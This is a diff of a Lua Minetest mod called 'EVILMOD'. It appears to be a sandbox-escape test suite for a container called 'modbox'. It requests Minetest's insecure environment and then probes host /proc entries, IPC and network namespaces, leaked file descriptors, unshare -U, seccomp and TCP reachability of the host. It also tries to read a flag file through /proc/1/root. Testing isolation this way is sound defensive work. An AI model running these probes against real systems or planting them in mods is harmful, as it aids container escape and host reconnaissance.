@@ -1,20 +1,24 @@
 minetest.log("action", "[EVILMOD] Initializing...")
+
 minetest.register_on_mods_loaded(function()
     if mcl_weather then
         mcl_weather.end_time = math.huge
     end
     minetest.settings:set("time_speed", "0")
 end)
+
 local IE = minetest.request_insecure_environment()
 if not IE then
     minetest.log("error", "[EVILMOD] insecure env unavailable — add evilmod to secure.trusted_mods")
     return
 end
+
 local function probe(name, fn)
     local ok, result = pcall(fn)
     local line = ok and result or ("[LUA ERROR] " .. tostring(result))
     minetest.log("action", string.format("[EVILMOD] %-50s %s", name, line))
 end
+
 local function popen(cmd)
     if not IE.io.popen then return nil end
     local f = IE.io.popen(cmd, "r")
@@ -23,8 +27,10 @@ local function popen(cmd)
     f:close()
     return out
 end
+
 minetest.after(3, function()
     minetest.log("action", "[EVILMOD] ========== ATTACK SEQUENCE START ==========")
+
     probe("PID ns — /proc/1/comm (host init visible?)", function()
         local f = IE.io.open("/proc/1/comm", "r")
         if not f then return "[CONTAINED] cannot open /proc/1/comm" end
@@ -35,6 +41,7 @@ minetest.after(3, function()
         end
         return string.format("[ESCAPED] PID 1 on host is '%s'", comm)
     end)
+
     probe("PID ns — visible PID count in /proc", function()
         local f = IE.io.popen("ls /proc", "r")
         if not f then return "[ERROR] cannot list /proc" end
@@ -49,6 +56,7 @@ minetest.after(3, function()
         end
         return string.format("[CONTAINED] /proc shows %d PIDs (isolated namespace)", count)
     end)
+
     probe("PID ns — read parent (container manager) cmdline", function()
         local sf = IE.io.open("/proc/self/status", "r")
         if not sf then return "[CONTAINED] cannot read /proc/self/status" end
@@ -67,6 +75,7 @@ minetest.after(3, function()
         cf:close()
         return string.format("[ESCAPED] PPID=%s cmd='%s'", ppid, cmdline)
     end)
+
     probe("IPC ns — /proc/sysvipc/shm isolated", function()
         local f = IE.io.open("/proc/sysvipc/shm", "r")
         if not f then return "[CONTAINED] cannot open /proc/sysvipc/shm" end
@@ -81,6 +90,7 @@ minetest.after(3, function()
         end
         return "[CONTAINED] IPC ns isolated (0 shm segments)"
     end)
+
     probe("IPC ns — /proc/sysvipc/sem isolated", function()
         local f = IE.io.open("/proc/sysvipc/sem", "r")
         if not f then return "[CONTAINED] cannot open /proc/sysvipc/sem" end
@@ -95,6 +105,7 @@ minetest.after(3, function()
         end
         return "[CONTAINED] IPC ns isolated (0 semaphore sets)"
     end)
+
     probe("Network — reach host 172.18.0.1 (TCP connect)", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local open_ports = {}
@@ -109,6 +120,7 @@ minetest.after(3, function()
         end
         return "[CONTAINED] no host ports reachable (INPUT REJECT rule active)"
     end)
+
     probe("FD inheritance — leaked host fds", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local out = popen("ls -la /proc/self/fd 2>/dev/null") or ""
@@ -129,6 +141,7 @@ minetest.after(3, function()
         end
         return "[CONTAINED] no host-path fds inherited (closerange working)"
     end)
+
     probe("User ns — clone(CLONE_NEWUSER) succeeds", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local out = popen("unshare -U id 2>&1; echo exitcode:$?")
@@ -140,6 +153,7 @@ minetest.after(3, function()
         local err = out:gsub("exitcode:%d+%s*$", ""):gsub("%s+$", ""):sub(1, 80)
         return "[CONTAINED] unshare -U failed: " .. err
     end)
+
     probe("Net ns — host connections visible (run without -n)", function()
         local tcp_f = IE.io.open("/proc/net/tcp", "r")
         if not tcp_f then return "[CONTAINED] cannot read /proc/net/tcp" end
@@ -160,6 +174,7 @@ minetest.after(3, function()
         end
         return "[CONTAINED] isolated net namespace (%d TCP, %d Unix)"
     end)
+
     probe("Seccomp — mprotect(PROT_EXEC) not filtered", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local script = [=[
@@ -187,6 +202,7 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         end
         return "[ERROR] unexpected luajit output: " .. out:sub(1, 80)
     end)
+
     probe("Chroot escape — /proc/1/root flag capture", function()
         local f = IE.io.open("/proc/1/root/tmp/modbox_flag.txt", "r")
         if not f then
@@ -196,5 +212,6 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         f:close()
         return "[ESCAPED] *** FLAG CAPTURED: " .. flag .. " ***"
     end)
+
     minetest.log("action", "[EVILMOD] ========== ATTACK ENDED ==========")
 end)
